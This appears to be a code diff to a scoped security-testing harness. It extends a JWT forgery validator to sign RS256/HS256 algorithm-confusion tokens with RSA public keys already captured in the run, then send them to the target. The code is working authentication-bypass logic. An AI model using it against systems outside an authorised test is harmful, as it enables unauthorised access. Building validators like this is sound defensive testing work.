@@ -42,6 +42,7 @@ import httpx
 from harness import global_throttle, identity_compare
 import harness.missing_auth_probe as map_
 from harness.models import Finding, HttpExchange
+from harness.run_observations import public_keys_in
 from .base import SentAnswer, Validator, ValidationResult
 
 _JWT_RE = re.compile(r"\b(eyJ[A-Za-z0-9_\-]+\.eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]*)\b")
@@ -177,6 +178,53 @@ def _rsa_jwks_to_pem(body: str, kid: str | None = None) -> list[tuple[str, bytes
     return out
 
 
+# Public keys the run already holds (its observed answers, the engagement's
+# captures, the handed exchange): how many keys, the HMAC-secret byte strings
+# tried per key, and the captures scanned. Bounds the extra forged sends.
+_MAX_CAPTURED_KEYS = 4
+_MAX_CAPTURED_KEY_FORGERIES = 8
+_MAX_CAPTURES_SCANNED = 2000
+
+
+def _pem_hmac_secrets(block: str) -> list[bytes]:
+    """The byte strings a confused verifier may use as its HMAC secret for one
+    served RSA public-key PEM: the block exactly as served, with and without a
+    final newline, and its SubjectPublicKeyInfo and PKCS#1 PEM serialisations.
+    [] for a block that is not an RSA public key."""
+    try:
+        from cryptography.hazmat.primitives import serialization
+        from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicKey
+        key = serialization.load_pem_public_key(block.replace("\r\n", "\n").encode())
+    except Exception:   # ImportError, a malformed block, an unsupported key
+        return []
+    if not isinstance(key, RSAPublicKey):
+        return []
+    text = block.replace("\r\n", "\n").rstrip("\n")
+    out: list[bytes] = []
+    served_eol = "\r\n" if "\r\n" in block else "\n"
+    for candidate in (block.encode(), (block + served_eol).encode(), (text + "\n").encode(),
+                      text.encode(),
+                      key.public_bytes(serialization.Encoding.PEM,
+                                       serialization.PublicFormat.SubjectPublicKeyInfo),
+                      key.public_bytes(serialization.Encoding.PEM,
+                                       serialization.PublicFormat.PKCS1)):
+        if candidate not in out:
+            out.append(candidate)
+    return out
+
+
+def _captured_key_secrets(keys, kid: str | None) -> list[tuple[str, bytes]]:
+    """(key kid, HMAC secret) for each captured public key: a PEM's byte forms,
+    an RSA JWK's PEM (a JWK whose kid differs from the token's is skipped)."""
+    out: list[tuple[str, bytes]] = []
+    for kind, key_kid, material in keys:
+        if kind == "pem":
+            out += [("", secret) for secret in _pem_hmac_secrets(material)]
+        elif kind == "jwk":
+            out += _rsa_jwks_to_pem(json.dumps({"keys": [json.loads(material)]}), kid)
+    return out
+
+
 def _kid_forgeries(header: dict, payload: dict) -> list[tuple[str, str]]:
     """`kid` key-confusion variants (V9). When a verifier derives the HMAC key
     from the attacker-controlled `kid` header, the key is known, so a validly
@@ -218,6 +266,49 @@ class JwtForgeValidator(Validator):
 
     def _skip(self, why: str) -> ValidationResult:
         return ValidationResult(self.name, "skipped", "jwt", summary=why)
+
+    def _captured_public_keys(self, exchange: HttpExchange) -> list[tuple[str, str, str]]:
+        """(kind, kid, material) for the public keys the run already holds in scope:
+        the handed exchange's own answer, the run's observed answers
+        (RunContext.observations) and the engagement's captures. Nothing is fetched."""
+        found: list[tuple[str, str, str]] = []
+
+        def in_scope(url: str) -> bool:
+            return bool(url) and (not self.allowed_hosts
+                                  or scope_lock.host_in_scope(url, self.allowed_hosts))
+
+        def add(kind: str, kid: str, material: str) -> None:
+            if len(found) < _MAX_CAPTURED_KEYS and not any(f[0] == kind and f[2] == material
+                                                          for f in found):
+                found.append((kind, kid, material))
+
+        def scan(url: str, status, body) -> None:
+            if in_scope(url) and isinstance(body, str) and isinstance(status, int) \
+                    and 200 <= status < 300:
+                for kind, kid, material in public_keys_in(body):
+                    add(kind, kid, material)
+
+        scan(exchange.url, exchange.response_status, exchange.response_body)
+        run = self.run_context
+        observations = getattr(run, "observations", None)
+        if observations is not None:
+            try:
+                for url, kind, kid, material in observations.public_keys():
+                    if in_scope(url):
+                        add(kind, kid, material)
+            except Exception:
+                pass
+        context = getattr(run, "experiment_context", None)
+        captured = (context.get("captured") if isinstance(context, dict) else None) or ()
+        for item in list(captured)[:_MAX_CAPTURES_SCANNED]:
+            if len(found) >= _MAX_CAPTURED_KEYS:
+                break
+            if isinstance(item, dict):
+                scan(str(item.get("url") or ""), item.get("response_status"), item.get("response_body"))
+            else:
+                scan(str(getattr(item, "url", "") or ""), getattr(item, "response_status", None),
+                     getattr(item, "response_body", None))
+        return found
 
     async def _probe(self, url: str, headers: dict) -> tuple[int | None, str]:
         """(status, body), or (None, why) when the probe got no response: the
@@ -388,6 +479,9 @@ class JwtForgeValidator(Validator):
         # JWKS endpoints and treat the exposed RSA public key bytes as the HMAC
         # secret.  A robust verifier rejects this because it pins the algorithm
         # and key type; a confused verifier validates our attacker-signed token.
+        # Public keys the run already captured anywhere in scope (a PEM or a JWK
+        # in any answer) are used the same way, without fetching anything.
+        captured_key_forgeries = 0
         if str(header.get("alg") or "").upper().startswith("RS"):
             origin = f"{urlsplit(exchange.url).scheme}://{urlsplit(exchange.url).netloc}"
             jwks_seen: set[str] = set()
@@ -410,6 +504,22 @@ class JwtForgeValidator(Validator):
                         confused_header["kid"] = key_kid
                     forgeries.append(("RS256 public-key/HMAC algorithm confusion",
                                       _hs256(confused_header, payload, pem)))
+            header_kid = str(header.get("kid") or "") or None
+            for key_kid, secret in _captured_key_secrets(self._captured_public_keys(exchange),
+                                                         header_kid):
+                if captured_key_forgeries >= _MAX_CAPTURED_KEY_FORGERIES:
+                    break
+                fingerprint = hashlib.sha256(secret).hexdigest()
+                if fingerprint in jwks_seen:
+                    continue
+                jwks_seen.add(fingerprint)
+                confused_header = dict(header)
+                confused_header["alg"] = "HS256"
+                if key_kid:
+                    confused_header["kid"] = key_kid
+                captured_key_forgeries += 1
+                forgeries.append(("RS256 public-key/HMAC algorithm confusion (a public key "
+                                  "the run captured)", _hs256(confused_header, payload, secret)))
         forgeries += _kid_forgeries(header, payload)
         for label, forged in forgeries:
             f_sent = await _send(exchange.url, _hdrs(forged))
@@ -441,4 +551,7 @@ class JwtForgeValidator(Validator):
             self.name, "not_confirmed", "jwt", confidence=0.6, confirmed=False,
             summary="JWT signature appears to be verified: alg:none, reused-signature, and kid "
                     "key-confusion forgeries were all rejected like the garbage control.",
-            evidence=f"garbage -> HTTP {g_status}; all {len(forgeries)} forgeries rejected at {exchange.url}."))
+            evidence=f"garbage -> HTTP {g_status}; all {len(forgeries)} forgeries rejected at {exchange.url}."
+                     + (f" They include {captured_key_forgeries} RS256/HS256 key-confusion "
+                        f"forgeries signed with public keys the run captured."
+                        if captured_key_forgeries else "")))
